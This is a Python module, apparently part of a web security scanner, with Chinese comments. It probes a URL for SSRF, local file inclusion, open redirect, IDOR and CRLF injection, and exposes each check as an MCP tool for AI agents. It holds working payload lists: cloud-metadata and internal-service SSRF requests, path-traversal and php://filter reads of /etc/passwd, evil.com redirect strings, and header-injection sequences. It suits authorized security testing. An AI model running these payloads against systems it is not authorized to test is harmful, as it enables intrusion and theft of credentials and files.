#!/usr/bin/env python3
"""
漏洞检测工具 - 访问控制类漏洞检测
包含: SSRF、LFI、开放重定向、IDOR、CRLF注入
"""

import logging
from urllib.parse import quote

from .._common import HAS_REQUESTS, get_verify_ssl

if HAS_REQUESTS:
    import requests

logger = logging.getLogger(__name__)


# ============ SSRF检测 ============

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/stat",
    "gopher://127.0.0.1:6379/_INFO",
]

SSRF_INDICATORS = [
    "root:",
    "daemon:",
    "bin:",
    "sys:",
    "ami-id",
    "instance-id",
    "local-ipv4",
    "computeMetadata",
    "attributes",
    "SSH-",
    "MySQL",
    "redis_version",
    "STAT pid",
    "memcached",
]


def ssrf_detect(url: str, param: str = None) -> dict:
    """SSRF检测 - 服务端请求伪造漏洞检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    test_params = (
        [param]
        if param
        else [
            "url",
            "link",
            "src",
            "target",
            "redirect",
            "uri",
            "path",
            "fetch",
            "load",
            "img",
            "image",
        ]
    )

    for p in test_params:
        for payload in SSRF_PAYLOADS:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{p}={quote(payload)}"
                resp = requests.get(
                    test_url, timeout=10, verify=get_verify_ssl(), allow_redirects=False
                )

                for indicator in SSRF_INDICATORS:
                    if indicator in resp.text:
                        vulns.append(
                            {
                                "type": "SSRF",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": payload,
                                "evidence": indicator,
                                "url": test_url,
                            }
                        )
                        break
            except (requests.RequestException, OSError):
                logger.warning("Suppressed exception", exc_info=True)

    return {"success": True, "url": url, "ssrf_vulns": vulns, "total": len(vulns)}


# ============ LFI检测 ============

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd%00",
    "....\\....\\....\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "file:///etc/passwd",
    "expect://id",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
]

LFI_INDICATORS = [
    "root:",
    "daemon:",
    "bin:",
    "sys:",
    "nobody:",
    "[fonts]",
    "[extensions]",
    "for 16-bit app support",
    "PATH=",
    "HOME=",
    "USER=",
    "PD9waHA",
    "cm9vdDo",  # base64 encoded
]


def lfi_detect(url: str, param: str = None, deep_scan: bool = True) -> dict:
    """LFI检测 - 本地文件包含漏洞检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    test_params = (
        [param]
        if param
        else [
            "file",
            "page",
            "path",
            "include",
            "doc",
            "document",
            "folder",
            "root",
            "pg",
            "template",
            "lang",
            "view",
        ]
    )

    payloads = LFI_PAYLOADS[:5] if not deep_scan else LFI_PAYLOADS

    for p in test_params:
        for payload in payloads:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{p}={quote(payload)}"
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                for indicator in LFI_INDICATORS:
                    if indicator in resp.text:
                        vulns.append(
                            {
                                "type": "LFI",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": payload,
                                "evidence": indicator,
                                "url": test_url,
                            }
                        )
                        break
            except (requests.RequestException, OSError):
                logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "lfi_vulns": vulns,
        "total": len(vulns),
        "recommendations": (
            ["禁用 allow_url_include", "使用白名单验证文件路径", "避免用户输入直接拼接文件路径"]
            if vulns
            else []
        ),
    }


# ============ 开放重定向检测 ============

REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "//evil.com%2f%2f",
    "///evil.com",
    "////evil.com",
    "/\\evil.com",
    "\\\\evil.com",
    "https:evil.com",
    "https:/evil.com",
    "//evil%E3%80%82com",
    "https://evil.com@trusted.com",
    "https://trusted.com.evil.com",
]


def redirect_detect(url: str, param: str = None) -> dict:
    """开放重定向检测 - Open Redirect漏洞检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    test_params = (
        [param]
        if param
        else [
            "url",
            "redirect",
            "return",
            "next",
            "target",
            "rurl",
            "dest",
            "destination",
            "redir",
            "redirect_uri",
            "continue",
            "goto",
        ]
    )

    for p in test_params:
        for payload in REDIRECT_PAYLOADS:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{p}={quote(payload)}"
                resp = requests.get(
                    test_url, timeout=10, verify=get_verify_ssl(), allow_redirects=False
                )

                # 检查响应头中的Location
                location = resp.headers.get("Location", "")
                if resp.status_code in [301, 302, 303, 307, 308]:
                    if "evil.com" in location.lower() or location.startswith("//"):
                        vulns.append(
                            {
                                "type": "Open Redirect",
                                "severity": "MEDIUM",
                                "param": p,
                                "payload": payload,
                                "redirect_to": location,
                                "url": test_url,
                            }
                        )
                        break

                # 检查响应体中的meta refresh
                if "evil.com" in resp.text.lower() and "refresh" in resp.text.lower():
                    vulns.append(
                        {
                            "type": "Open Redirect (Meta Refresh)",
                            "severity": "MEDIUM",
                            "param": p,
                            "payload": payload,
                            "url": test_url,
                        }
                    )
                    break
            except (requests.RequestException, OSError):
                logger.warning("Suppressed exception", exc_info=True)

    return {"success": True, "url": url, "redirect_vulns": vulns, "total": len(vulns)}


# ============ IDOR检测 ============


def idor_detect(url: str, param: str = None, test_values: list = None) -> dict:
    """IDOR检测 - 不安全的直接对象引用检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    test_params = (
        [param]
        if param
        else [
            "id",
            "uid",
            "user_id",
            "account",
            "order_id",
            "doc_id",
            "file_id",
            "item",
            "pid",
            "profile",
        ]
    )

    # 测试值：当前值 vs 其他用户可能的值
    if test_values is None:
        test_values = ["1", "2", "100", "999", "admin", "0", "-1"]

    baseline_responses = {}

    for p in test_params:
        for val in test_values[:3]:  # 限制测试数量
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{p}={val}"
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                key = f"{p}:{val}"
                baseline_responses[key] = {
                    "status": resp.status_code,
                    "length": len(resp.text),
                    "url": test_url,
                }
            except (requests.RequestException, OSError):
                logger.warning("Suppressed exception", exc_info=True)

    # 分析响应差异
    for p in test_params:
        responses_for_param = {k: v for k, v in baseline_responses.items() if k.startswith(f"{p}:")}

        if len(responses_for_param) >= 2:
            lengths = [v["length"] for v in responses_for_param.values()]
            statuses = [v["status"] for v in responses_for_param.values()]

            # 如果不同ID返回不同内容且状态码都是200，可能存在IDOR
            if len(set(lengths)) > 1 and all(s == 200 for s in statuses):
                avg_length = sum(lengths) / len(lengths)
                if all(l > 100 for l in lengths):  # 确保有实际内容
                    vulns.append(
                        {
                            "type": "Potential IDOR",
                            "severity": "HIGH",
                            "param": p,
                            "evidence": f"不同ID返回不同内容 (长度差异: {min(lengths)}-{max(lengths)} bytes)",
                            "recommendation": "需要手动验证是否为敏感数据泄露",
                        }
                    )

    return {
        "success": True,
        "url": url,
        "idor_vulns": vulns,
        "total": len(vulns),
        "note": "IDOR检测需要业务上下文，建议人工验证",
    }


# ============ CRLF注入检测 ============

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:%20evil=value",
    "%0d%0aX-Injected:%20header",
    "%0aSet-Cookie:%20evil=value",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "\r\nSet-Cookie:%20evil=value",
    "%E5%98%8A%E5%98%8DSet-Cookie:%20evil=value",  # UTF-8 encoded
    "%0d%0aContent-Length:%200%0d%0a%0d%0a",
]


def crlf_detect(url: str, param: str = None) -> dict:
    """CRLF注入检测 - HTTP响应头注入检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    test_params = (
        [param] if param else ["url", "redirect", "return", "next", "path", "lang", "page"]
    )

    for p in test_params:
        for payload in CRLF_PAYLOADS:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{p}={payload}"
                resp = requests.get(
                    test_url, timeout=10, verify=get_verify_ssl(), allow_redirects=False
                )

                # 检查是否成功注入了响应头
                if "X-Injected" in resp.headers or "evil=value" in resp.headers.get(
                    "Set-Cookie", ""
                ):
                    vulns.append(
                        {
                            "type": "CRLF Injection",
                            "severity": "HIGH",
                            "param": p,
                            "payload": payload,
                            "injected_header": (
                                "Set-Cookie" if "evil" in str(resp.headers) else "X-Injected"
                            ),
                            "url": test_url,
                        }
                    )
                    break

                # 检查响应体是否被污染
                if payload in resp.text and "<script>" in resp.text.lower():
                    vulns.append(
                        {
                            "type": "CRLF Response Splitting",
                            "severity": "HIGH",
                            "param": p,
                            "payload": payload,
                            "url": test_url,
                        }
                    )
                    break
            except (requests.RequestException, OSError):
                logger.warning("Suppressed exception", exc_info=True)

    return {"success": True, "url": url, "crlf_vulns": vulns, "total": len(vulns)}


# ============ MCP工具注册 ============


def register_access_tools(mcp) -> None:
    """注册访问控制类检测工具到MCP服务器"""

    @mcp.tool()
    def ssrf_detect_tool(url: str, param: str = None) -> dict:
        """SSRF检测 - 服务端请求伪造漏洞检测"""
        return ssrf_detect(url, param)

    @mcp.tool()
    def lfi_detect_tool(url: str, param: str = None, deep_scan: bool = True) -> dict:
        """LFI检测 - 本地文件包含漏洞检测"""
        return lfi_detect(url, param, deep_scan)

    @mcp.tool()
    def redirect_detect_tool(url: str, param: str = None) -> dict:
        """开放重定向检测 - Open Redirect漏洞检测"""
        return redirect_detect(url, param)

    @mcp.tool()
    def idor_detect_tool(url: str, param: str = None, test_values: list = None) -> dict:
        """IDOR检测 - 不安全的直接对象引用检测"""
        return idor_detect(url, param, test_values)

    @mcp.tool()
    def crlf_detect_tool(url: str, param: str = None) -> dict:
        """CRLF注入检测 - HTTP响应头注入检测"""
        return crlf_detect(url, param)

    logger.info("已注册访问控制类漏洞检测工具: ssrf, lfi, redirect, idor, crlf")


__all__ = [
    "ssrf_detect",
    "lfi_detect",
    "redirect_detect",
    "idor_detect",
    "crlf_detect",
    "register_access_tools",
]
